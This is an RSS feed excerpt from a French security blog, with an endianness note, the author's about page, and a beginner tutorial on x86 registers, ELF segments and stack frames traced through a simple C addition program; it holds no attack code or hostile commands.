Effectivement, je n&amp;rsquo;ai pas donné d&amp;rsquo;explication sur cette inversion. En informatique, il y a deux façons d&amp;rsquo;écrire une adresse et on appelle cela l&amp;rsquo;&lt;a href=&#34;https://fr.wikipedia.org/wiki/Endianness&#34;&gt;endianness&lt;/a&gt;. Les architectures de processeurs utilisent l&amp;rsquo;une ou l&amp;rsquo;autre :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Big endian : l&amp;rsquo;ordre des octets sont de gauche à droite (octets de poids fort au poids faible). Par exemple &lt;code&gt;0xA0B70708&lt;/code&gt; =&amp;gt; &lt;code&gt;A0 B7 07 08&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Little endian : l&amp;rsquo;ordre des octets sont de droite à gauche (octets de poids faible au poids fort). Par exemple &lt;code&gt;0xA0B70708&lt;/code&gt; =&amp;gt; &lt;code&gt;08 07 B7 A0&lt;/code&gt;. C&amp;rsquo;est cet ordre qui est &lt;strong&gt;utilisé par les architectures X86&lt;/strong&gt;.&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title></title>
      <link>https://www.mycybersharing.com/about/</link>
      <pubDate>Sun, 17 Feb 2019 00:00:00 +0000</pubDate>
      
      <guid>https://www.mycybersharing.com/about/</guid>
      <description>

&lt;h2 id=&#34;bienvenue-à-vous&#34;&gt;Bienvenue à vous !&lt;/h2&gt;

&lt;p&gt;J&amp;rsquo;ai décidé de créer ce blog pour partager de l&amp;rsquo;information sur différents domaines mais principalement sur la sécurité informatique, une passion pour moi. Vous pourrez donc trouver aussi bien des articles sur de la cybersécurité ou bien la robotique mais également l&amp;rsquo;astronomie. De plus, ce blog me permet aussi de m&amp;rsquo;organiser, de regrouper ce que j&amp;rsquo;ai appris sur un sujet et de tout mettre au propre ici.&lt;br /&gt;
Je trouve aussi que de partager ce que l&amp;rsquo;on a appris permet d&amp;rsquo;en apprendre encors plus.&lt;br /&gt;
&lt;br /&gt;
Je peux me tromper, je peux ne pas ou mal avoir compris un sujet et heureusement! Sinon ça voudrait dire que je suis parfait. Ce qui est bien c&amp;rsquo;est que vous pouvez partager votre avis, proposer des idées, me critiquer en bien ou en mal&amp;hellip; bref, c&amp;rsquo;est important pour moi alors n&amp;rsquo;hésitez pas à placer un petit commentaire en bas de la page ❤️.&lt;/p&gt;

&lt;h2 id=&#34;et-moi-dans-tout-ça&#34;&gt;Et moi dans tout ça&lt;/h2&gt;

&lt;p&gt;Je m&amp;rsquo;appelle Julien (alias hack42), je suis actuellement en dernière année de master dans la sécurité informatique et je suis également un alternant. J&amp;rsquo;ai commencé le développement informatique à l&amp;rsquo;âge de 12ans et à découvrir la sécurité informatique il y a 3ans. Depuis, je participe régulièrement à des CTF, challenges, événements&amp;hellip; Je suis déterminé dans mes objectifs et j&amp;rsquo;essaie toujours de les atteindre.&lt;br /&gt;
J&amp;rsquo;aime apprendre des autres et partager avec eux, c&amp;rsquo;est pourquoi j&amp;rsquo;ai créé &amp;ldquo;My Cyber Sharing&amp;rdquo;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/ireland.jpg&#34; alt=&#34;ireland&#34; /&gt;
&lt;em&gt;2018, Irlande ❤️&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&#34;quelques-liens&#34;&gt;Quelques liens&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://thinkloveshare.com&#34;&gt;Blog de Laluka&lt;/a&gt; : Un ami rencontré sur root-me que j&amp;rsquo;apprécie beaucoup.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.dailysecurity.fr&#34;&gt;Blog de Geluchat&lt;/a&gt; : Je l&amp;rsquo;ai également rencontré sur root-me, un très bon hacker!&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://beta.hackndo.com&#34;&gt;Hackndo&lt;/a&gt; : Très bon blog sur la sécu.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings&#34;&gt;PayloadsAllTheThings&lt;/a&gt; : Un github d&amp;rsquo;exception.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.elysium-security.com&#34;&gt;Elysium Security&lt;/a&gt; : Merci à eux de me former ainsi que ma promotion. Des personnes exceptionnellement compétentes.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://sites.uclouvain.be/SystInfo/notes/Theorie/html/index.html&#34;&gt;Uclouvain&lt;/a&gt; : Quelques cours informatiques.&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.youtube.com/user/EthnicalNightamre&#34;&gt;Ethnical&lt;/a&gt; : La chaîne Youtube inévitable.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;crédits&#34;&gt;Crédits&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Template du site et feedback complet : un grand merci à Laluka pour le partage des sources =&amp;gt; &lt;a href=&#34;https://github.com/ThinkLoveShare/sources&#34;&gt;https://github.com/ThinkLoveShare/sources&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>App-Sys: Débuter progressivement</title>
      <link>https://www.mycybersharing.com/cybersecu/app_sys_start_gradually/</link>
      <pubDate>Sun, 17 Feb 2019 00:00:00 +0000</pubDate>
      
      <guid>https://www.mycybersharing.com/cybersecu/app_sys_start_gradually/</guid>
      <description>

&lt;h2 id=&#34;application-système-vous-avez-dit&#34;&gt;&amp;ldquo;Application - Système&amp;rdquo;, vous avez dit ?&lt;/h2&gt;

&lt;p&gt;Oui, &amp;ldquo;Application - Système&amp;rdquo; :) C&amp;rsquo;est le principe d&amp;rsquo;exploiter une vulnérabilité applicative principalement liée à une erreur de développement et qui peut finir par aboutir à des corruptions de différentes zones mémoire.
&lt;br /&gt;
&lt;br /&gt;
L&amp;rsquo;objectif ici c&amp;rsquo;est d&amp;rsquo;aborder pas-à-pas ce domaine en passant par les registres, la structure d&amp;rsquo;un exécutable, la pile, le tas&amp;hellip; bref, des choses compliquées pour un débutant qui souhaite se lancer dans l&amp;rsquo;exploitation de failles systèmes.&lt;/p&gt;

&lt;h2 id=&#34;les-débuts-du-intel-8086&#34;&gt;Les débuts du Intel 8086&lt;/h2&gt;

&lt;p&gt;L&amp;rsquo;Intel 8086 est un microprocesseur (unité central de traitement) sortie en 1978 dont l&amp;rsquo;objectif est d&amp;rsquo;effectuer des calculs. C&amp;rsquo;est le premier processeur de la famille X86, qui est devenu à ce jour une grande famille et la plus répandue dans le monde des ordinateurs et serveurs informatiques.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/Intel_C8086.jpg&#34; alt=&#34;C8086&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Cette petite bébête exécute des instructions machines permettant d&amp;rsquo;effectuer des opérations (l&amp;rsquo;addition, la soustraction, multiplication, ET logique&amp;hellip;), c&amp;rsquo;est ce qui fait fonctionner nos programmes et notre système d&amp;rsquo;exploitation. Cette liste d&amp;rsquo;instructions est appelée &amp;ldquo;jeu d&amp;rsquo;instructions&amp;rdquo;.&lt;br /&gt;
Depuis 1978, les processeurs de la famille X86 ont gardé la rétrocompatibilité avec la précédente version. Cela veut dire que le jeu d&amp;rsquo;instructions du 8086 est également présent dans nos dernières générations de processeurs. Il est donc possible de faire fonctionner un programme datant de 1978 sur les derniers processeurs :). Pas mal, non?&lt;/p&gt;

&lt;h2 id=&#34;et-ces-instructions-ça-ressemble-à-quoi-exactement&#34;&gt;Et ces instructions, ça ressemble à quoi exactement ?&lt;/h2&gt;

&lt;p&gt;Une instruction c&amp;rsquo;est une suite de bits représentant un ordre pour le microprocesseur. Comme le binaire est difficilement compréhensible pour les humains, le programmeur utilise une abréviation, un simple mot-clé suivis des arguments qui vont désigner l&amp;rsquo;instruction à exécuter. Par la suite, ces mots-clés sont convertis en binaire avant d&amp;rsquo;être envoyé au microprocesseur.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;mov ah, 5		; déplace 5 dans &amp;quot;ah&amp;quot; 	: 	ah = 5
add ah, 3		; effectue une addition : 	ah = ah + 3 (&amp;quot;ah&amp;quot; vaut 8 du coup)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Prenons exemple avec la première instruction :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[mov ah, 5] = [0xb405] = [10110100 00000101] &amp;lt;-- envoyé au microprocesseur
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Les instructions possèdent une taille qui sera variable suivant les arguments passés à celle-ci mais également de l&amp;rsquo;architecture. Si nous reprenons l&amp;rsquo;instruction &amp;ldquo;mov&amp;rdquo; utilisée ci-dessus, elle fait très exactement 2 octets (0xb4 0x05).&lt;br /&gt;
&lt;br /&gt;
En réalité, le petit mot-clé au début de l&amp;rsquo;instruction est appellé un &amp;ldquo;&lt;strong&gt;opcode&lt;/strong&gt;&amp;rdquo; (code opération) et permet de déterminer la nature de l&amp;rsquo;instruction. &amp;ldquo;mov&amp;rdquo; est donc un opcode parmis tant d&amp;rsquo;autres.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/instruction.jpg&#34; alt=&#34;instruction&#34; /&gt;&lt;/p&gt;

&lt;h2 id=&#34;les-registres-pour-nos-calcules&#34;&gt;Les registres pour nos calcules&lt;/h2&gt;

&lt;p&gt;Chaque microprocesseur inclut une suite de plusieurs registres, un emplacement mémoire interne au microprocesseur. Il s&amp;rsquo;agit de la mémoire la plus rapide d&amp;rsquo;un ordinateur dû fait qu&amp;rsquo;elle soit présente directement dans l&amp;rsquo;unité de calcul.&lt;br /&gt;
Ces petites zones de mémoire ont commencé par faire 16 bits (à l&amp;rsquo;époque du 8086), puis 32 bits et maintenant 64 bits pour les processeurs x64.&lt;br /&gt;
Suivant la version que nous souhaitons, le préfixe change : &lt;strong&gt;E&lt;/strong&gt; pour obtenir la version 32 bits et &lt;strong&gt;R&lt;/strong&gt; pour la version 64 bits du registre.&lt;br /&gt;
Voici la liste des registres les plus importants:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;AX&lt;/strong&gt; (16 bits) -&amp;gt; &lt;strong&gt;EAX&lt;/strong&gt; (32 bits) -&amp;gt; &lt;strong&gt;RAX&lt;/strong&gt; (64 bits)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;EBX&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ECX&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;EDX&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ESI&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;EDI&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;EBP&lt;/strong&gt; : &lt;em&gt;adresse de la partie Basse de la Pile&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ESP&lt;/strong&gt; : &lt;em&gt;adresse de la partie Supérieure de la Pile&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;EIP&lt;/strong&gt; : &lt;em&gt;adresse de la prochaine instruction à exécuter&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;em&gt;La pile est expliquée plus bas, ne vous inquiétez pas ;)&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Les 4 premiers registres 16 bits sont également décomposés en sous registres.&lt;br /&gt;
Par exemple pour AX, nous avons également :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;AL : registre de poids faible 8 bits&lt;/li&gt;
&lt;li&gt;AH : registre de poids fort 8 bits&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/register.jpg&#34; alt=&#34;register&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Ces registres sont utilisés par les différentes instructions du programme.&lt;/p&gt;

&lt;h2 id=&#34;un-programme-comment-ça-marche-sinon&#34;&gt;Un programme comment ça marche sinon ?&lt;/h2&gt;

&lt;p&gt;Suivant le système d&amp;rsquo;exploitation, un programme va avoir une structure différente mais similaire. Nous allons nous pencher sur la structure du format de fichier ELF (Executable and Linkable Format) qui est le format des applications sous linux.&lt;/p&gt;

&lt;p&gt;Avant qu&amp;rsquo;un programme soit exécuté, il est chargé en mémoire et ensuite la première instruction se trouvant au point d&amp;rsquo;entrée du programme (&lt;strong&gt;EP&lt;/strong&gt; pour Entry Point) est exécutée.&lt;/p&gt;

&lt;h3 id=&#34;le-système-d-adressage-mémoire&#34;&gt;Le système d&amp;rsquo;adressage mémoire&lt;/h3&gt;

&lt;p&gt;Un programme contient une zone mémoire divisée en octets. Chaque octet de cette zone contient une adresse représentée en &lt;a href=&#34;https://fr.wikipedia.org/wiki/Syst%C3%A8me_hexad%C3%A9cimal&#34;&gt;hexadécimal&lt;/a&gt; permettant de l&amp;rsquo;utiliser. La première adresse est la plus petite et la dernière la plus grande.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Mémoire du programme&lt;/em&gt;&lt;/p&gt;

&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Adresse mémoire&lt;/th&gt;
&lt;th&gt;Valeur&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;

&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;4000&lt;/td&gt;
&lt;td&gt;B&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;4001&lt;/td&gt;
&lt;td&gt;o&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;4002&lt;/td&gt;
&lt;td&gt;n&lt;/td&gt;
&lt;/tr&gt;

&lt;tr&gt;
&lt;td&gt;&amp;hellip;.&lt;/td&gt;
&lt;td&gt;&amp;hellip;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Ces adresses sont codées suivant l&amp;rsquo;architecture de destination. Un programme compilé pour une architecture 32 bits aura des adresses 32 bits et un programme 64 bits, des adresses 64 bits. Il n&amp;rsquo;est pas possible de faire fonctionner un programme 64 bits sur une architecture de processeur 32 bits. En revanche, l&amp;rsquo;inverse est possible en simulant une architecture 32 bits et ainsi un programme 32 bits pourra fonctionner sur un processeur 64 bits.
&lt;br /&gt;
&lt;br /&gt;
Deux instances d&amp;rsquo;un même programme peuvent utiliser les mêmes adresses sans que cela pose problème&amp;hellip; Ce qui ne devrait pas être possible.&lt;br /&gt;
Cela a été rendu possible grâce à l&amp;rsquo;utilisation de la mémoire virtuelle. Sur un système, deux types d&amp;rsquo;adresses existent : les adresses virtuelles et les adresses physiques.&lt;br /&gt;
Pour faire simple, un programme a l&amp;rsquo;impression qu&amp;rsquo;il possède toute la mémoire à lui seul parce-qu&amp;rsquo;on lui a attribué une zone mémoire virtuelle et non réelle :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Adresse virtuelle : elles sont utilisées à l&amp;rsquo;intérieur d&amp;rsquo;un programme&lt;/li&gt;
&lt;li&gt;Adresse physique : c&amp;rsquo;est les adresses utilisées physiquement par les puces présentes sur les barrettes de RAM et également par le noyau (c&amp;rsquo;est lui qui fait la liaison entre les programmes et le matériel)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/virtual_memory.jpg&#34; alt=&#34;virtual memory&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Voilà pourquoi un programme peut utiliser les mêmes adresses virtuelles mais pas les mêmes adresses physiques. C&amp;rsquo;est le noyau du système d&amp;rsquo;exploitation qui gère les opérations de plus bas niveau en relation avec le matériel et ainsi est amené à manipuler les adresses physiques.&lt;/p&gt;

&lt;p&gt;Les adresses sont utilisées partout et pour tout. Tout est adresse, que l&amp;rsquo;on désigne une fonction, une variable, une suite d&amp;rsquo;instructions&amp;hellip; Elles permettent d&amp;rsquo;accéder à une zone de la mémoire en utilisant un identifiant, un nombre entier naturel.&lt;/p&gt;

&lt;h3 id=&#34;différents-segments&#34;&gt;Différents segments&lt;/h3&gt;

&lt;p&gt;Un programme contient plusieurs segments (sous-zone mémoire) qui sont des espaces d&amp;rsquo;adressage virtuel contenant toutes les informations permettant de mener à bien l&amp;rsquo;exécution du programme (des chaînes de caractères, des données, les instructions du programme&amp;hellip;).&lt;br /&gt;
Les segments sont attachés à des droits d&amp;rsquo;accès (lecture/écriture/exécution) permettant ainsi de les protéger.&lt;br /&gt;
&lt;br /&gt;
Les principaux segments sont :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;.text&lt;/strong&gt; : contient les instructions du programme (le code)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;.data&lt;/strong&gt; : contient toutes les variables globales ou statiques possédant une valeur prédéfinie et pouvant être modifiées&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;.rodata&lt;/strong&gt; : à l&amp;rsquo;opposition au segment .data, ce segment est uniquement en lecture seule (&lt;strong&gt;ro&lt;/strong&gt; pour read-only)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;.bss&lt;/strong&gt; : contient toutes les variables globales ou statiques initialisées à zéro ou n&amp;rsquo;ayant pas d&amp;rsquo;initialisation explicite dans le code source&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;heap&lt;/strong&gt; : le tas contient toutes les variables dynamiquement allouées au cours de l&amp;rsquo;exécution du programme&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;stack&lt;/strong&gt; : la pile est une structure &lt;a href=&#34;https://fr.wikipedia.org/wiki/Last_in,_first_out&#34;&gt;LIFO&lt;/a&gt;. Elle est utilisée pour stocker des données durant l&amp;rsquo;exécution du programme pour pouvoir les récupérer plus tard&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Cette liste n&amp;rsquo;est pas complète mais les principaux segments y sont. Ne vous inquiétez pas si vous n&amp;rsquo;avez pas très bien compris à quoi servaient les segments. Ça viendra avec la pratique.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/segments.jpg&#34; alt=&#34;segments&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Ce schéma illustre une représentation de la mémoire virtuelle d&amp;rsquo;un programme. La position des segments ne change pas d&amp;rsquo;une exécution à l&amp;rsquo;autre et reste toujours dans cet ordre.&lt;br /&gt;
Nous pouvons constater que la pile grossit du haut vers le bas et que le tas grossit du bas vers le haut. La taille de ces deux segments n&amp;rsquo;est donc pas fixe.&lt;/p&gt;

&lt;h3 id=&#34;mais-cette-pile-c-est-quoi-en-fait&#34;&gt;Mais cette pile, c&amp;rsquo;est quoi en fait ?&lt;/h3&gt;

&lt;p&gt;Ça!&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/stack_1.jpg&#34; alt=&#34;stack&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Bon d&amp;rsquo;accord, pas exactement mais il y a des points communs avec la pile de notre programme. La pile est une structure LIFO (Last in, first out), c&amp;rsquo;est-à-dire que le dernier élément ajouté sera le premier à être retiré. Quand on empile des assiettes les unes sur les autres, il faut d&amp;rsquo;abord retirer la première pour ensuite retirer la deuxième assiette de la pile.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/stack_2.jpg&#34; alt=&#34;stack&#34; /&gt;&lt;/p&gt;

&lt;p&gt;La pile est principalement utilisée pour stocker les données nécessaires à l&amp;rsquo;exécution d&amp;rsquo;une fonction et également préserver le pointeur d&amp;rsquo;exécution (registre EIP) afin de reprendre l&amp;rsquo;exécution de cette fonction. On peut y retrouver les arguments de notre fonction mais également les variables locales à celle-ci. Toutes ces choses-là composent la &lt;strong&gt;stack frame&lt;/strong&gt; (cadre de pile).&lt;/p&gt;

&lt;h3 id=&#34;un-exemple-concret&#34;&gt;Un exemple concret&lt;/h3&gt;

&lt;p&gt;Prenons l&amp;rsquo;exemple d&amp;rsquo;un programme très basic possédant deux fonctions : &amp;ldquo;main&amp;rdquo; et &amp;ldquo;addition&amp;rdquo;.&lt;br /&gt;
Le programme va réaliser la somme entre deux nombres et afficher le résultat à l&amp;rsquo;écran :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;

void addition(int a, int b) {
    printf(&amp;quot;La somme de %d et %d est %d\n&amp;quot;, a, b, a + b);
}

int main() {
    addition(4, 8); // &amp;lt;= Appel de la fonction &amp;quot;addition&amp;quot;
    return 0;
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lançons la compilation du programme et exécutons-le sans plus attendre :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[julien@hack42]$ gcc main.c -o test -m32
[julien@hack42]$ ./test 
La somme de 4 et 8 est 12
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;La commande &amp;ldquo;gcc&amp;rdquo; (GNU Compiler Collection) est un ensemble de compilateurs capables de compiler divers langages de programmation. Ici, nous l&amp;rsquo;utilisons pour compiler un programme en C. L&amp;rsquo;argument &amp;ldquo;-m32&amp;rdquo; permet de compiler notre programme en 32 bits et ainsi notre programme possédera des adresses de 4 octets.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Mais du coup qu&amp;rsquo;est-ce qu&amp;rsquo;il se passe concrètement pendant l&amp;rsquo;exécution du programme ?&lt;/em&gt;&lt;/strong&gt;&lt;br /&gt;
Tout d&amp;rsquo;abord, le programme commence par exécuter la fonction principale &amp;ldquo;main&amp;rdquo; et enfin la fonction &amp;ldquo;addition&amp;rdquo; est appelée.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;En réalité, c&amp;rsquo;est la fonction &amp;ldquo;_start&amp;rdquo; qui appelle notre fonction &amp;ldquo;main&amp;rdquo;. Cette fonction est ajoutée par le compilateur et contient le code de démarrage de l&amp;rsquo;environnement d&amp;rsquo;exécution C. Elle s&amp;rsquo;occupe de configurer des éléments, remplit le tableau d&amp;rsquo;arguments, compte le nombre d&amp;rsquo;arguments, etc&amp;hellip;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;L&amp;rsquo;opcode &amp;ldquo;call&amp;rdquo; en assembleur est utilisé pour appeler la fonction &amp;ldquo;addition&amp;rdquo;. Regardons à quoi ressemble le code assembleur permettant d&amp;rsquo;effectuer cet appel :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[-------------------------------------code-------------------------------------]
   0x804846f &amp;lt;main+20&amp;gt;:	push   0x8
   0x8048471 &amp;lt;main+22&amp;gt;:	push   0x4
=&amp;gt; 0x8048473 &amp;lt;main+24&amp;gt;:	call   0x8048436 &amp;lt;addition&amp;gt;
   0x8048478 &amp;lt;main+29&amp;gt;:	add    esp,0x10
Guessed arguments:
arg[0]: 0x4 
arg[1]: 0x8
[------------------------------------stack-------------------------------------]
0000| 0xffffc560 --&amp;gt; 0x4 
0004| 0xffffc564 --&amp;gt; 0x8
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;On constate que les arguments sont empilés (avec &amp;ldquo;push&amp;rdquo;) sur le haut de la pile et c&amp;rsquo;est seulement après cela que la fonction est appelée.&lt;br /&gt;
&lt;strong&gt;&lt;em&gt;Petite remarque : les arguments sont empilés en commençant par le dernier afin d&amp;rsquo;avoir le premier en haut de la pile.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Maintenant allons voir comment ça se passe pour la fonction &amp;ldquo;addition&amp;rdquo; :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;[-------------------------------------code-------------------------------------]
=&amp;gt; 0x8048436 &amp;lt;addition&amp;gt;:	  push   ebp
   0x8048437 &amp;lt;addition+1&amp;gt;:	mov    ebp,esp
   0x8048439 &amp;lt;addition+3&amp;gt;:	sub    esp,0x8
   0x804843c &amp;lt;addition+6&amp;gt;:	mov    edx,DWORD PTR [ebp+0x8]
   0x804843f &amp;lt;addition+9&amp;gt;:	mov    eax,DWORD PTR [ebp+0xc]
[------------------------------------stack-------------------------------------]
0000| 0xffffc55c --&amp;gt; 0x8048478 (&amp;lt;main+29&amp;gt;:	add    esp,0x10)
0004| 0xffffc560 --&amp;gt; 0x4 
0008| 0xffffc564 --&amp;gt; 0x8
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Mais&amp;hellip; il y a un élément supplémentaire en haut de la pile !&lt;br /&gt;
Eh oui. Pour pouvoir reprendre l&amp;rsquo;exécution de la fonction &amp;ldquo;main&amp;rdquo;, l&amp;rsquo;instruction &amp;ldquo;call&amp;rdquo; sauvegarde le registre EIP (contenant l&amp;rsquo;instruction suivante) en le plaçant sur la pile. Dans notre exemple, &amp;ldquo;0x8048478&amp;rdquo; (main+29).&lt;/p&gt;

&lt;h4 id=&#34;initialiser-la-stack-frame-prologue&#34;&gt;Initialiser la stack frame (prologue)&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Chaque fonction possède sa propre stack frame&lt;/strong&gt; et la fonction &amp;ldquo;addition&amp;rdquo; n&amp;rsquo;y échappe pas. Cela veut dire qu&amp;rsquo;elle doit donc se réserver sa stack frame. Regardez ces deux instructions :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;push   ebp
mov    ebp,esp
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ces deux instructions au début de la fonction &amp;ldquo;addition&amp;rdquo; sont appelées le &lt;strong&gt;prologue&lt;/strong&gt;. Elles permettent dans un premier temps de sauvegarder le bas de la pile courante et ensuite d&amp;rsquo;en initialiser une nouvelle. Attendez, laissez-moi vous faire un schéma pour que ça soit plus simple !&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/stack_frame.jpg&#34; alt=&#34;stack frame&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Vous voyez que la stack frame de &amp;ldquo;addition&amp;rdquo; est vide, parce qu&amp;rsquo;elle n&amp;rsquo;a pas encore été utilisée. De ce fait, le pointeur ESP est identique au pointeur EBP (ils sont confondus). Quand la stack frame de &amp;ldquo;addition&amp;rdquo; va être consommée, alors le pointeur ESP va monter vers les adresses les plus basses.&lt;br /&gt;
Maintenant voyons comment récupérer les arguments qui ont été passés à la fonction &amp;ldquo;addition&amp;rdquo;.&lt;/p&gt;

&lt;h4 id=&#34;récupérer-les-arguments&#34;&gt;Récupérer les arguments&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;mov    edx,DWORD PTR [ebp+0x8]
mov    eax,DWORD PTR [ebp+0xc]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;En français, cela donnerait :&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&amp;ldquo;Copier la valeur (DWORD pour &lt;a href=&#34;https://fr.wikipedia.org/wiki/Mot_(architecture_informatique)&#34;&gt;double mot&lt;/a&gt;) pointant en EBP+8 vers le registre EDX&amp;rdquo; (&lt;strong&gt;argument 1&lt;/strong&gt;)&lt;/li&gt;
&lt;li&gt;&amp;ldquo;Copier la valeur pointant en EBP+12 vers le registre EAX&amp;rdquo; (&lt;strong&gt;argument 2&lt;/strong&gt;)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Comme EBP pointe sur le haut de la stack frame de &amp;ldquo;main&amp;rdquo; alors il suffit de l&amp;rsquo;utiliser comme référence. Pour récupérer les arguments, nous devons donc faire &lt;strong&gt;&amp;ldquo;EBP+0x8&amp;rdquo; pour le premier&lt;/strong&gt; et &lt;strong&gt;&amp;ldquo;EBP+0xc&amp;rdquo; (0xc = 12) pour le second&lt;/strong&gt; (regardez le schéma plus haut).&lt;/p&gt;

&lt;h4 id=&#34;restaurer-la-stack-frame-de-main-épilogue&#34;&gt;Restaurer la stack frame de main (épilogue)&lt;/h4&gt;

&lt;p&gt;A la fin de la fonction &amp;ldquo;addition&amp;rdquo;, il faut restaurer la stack frame de main et reprendre l&amp;rsquo;exécution de cette dernière. Regardons maintenant les dernières instructions de la fonction &amp;ldquo;addition&amp;rdquo; pour comprendre comment cela fonctionne :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;leave  
ret 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Eh oui, c&amp;rsquo;est ces deux petites instructions qui permettent de restaurer la stack frame de main et ainsi reprendre son exécution normalement. On appelle cette phase, l&amp;rsquo;&lt;strong&gt;épilogue&lt;/strong&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;Vous vous souvenez que dans le prologue EBP a été empilé en haut de la pile ? L&amp;rsquo;instruction &amp;ldquo;leave&amp;rdquo; va maintenant utiliser cette valeur pour restaurer la stack frame de main :&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://www.mycybersharing.com/img/stack_frame_restore.jpg&#34; alt=&#34;stack frame restore&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Dans l&amp;rsquo;ordre, l&amp;rsquo;instruction leave va effectuer ceci :&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Restauration de ESP. Pour cela, ESP = EBP+0x4&lt;/li&gt;
&lt;li&gt;Restauration de EBP. Pour cela, il utilise la valeur empilée sur la pile tout au début (valeur en bleue sur le schéma). La valeur de EBP vaudra 0xffffc578.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;L&amp;rsquo;instruction &amp;ldquo;leave&amp;rdquo; est équivalente à ceci :&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;lea    esp,[ebp+0x4]				; esp = ebp + 4
mov    ebp,DWORD PTR [ebp]	; ebp = valeur de ebp
&lt;/code&gt;&lt;/pre&gt;

&lt;hr /&gt;

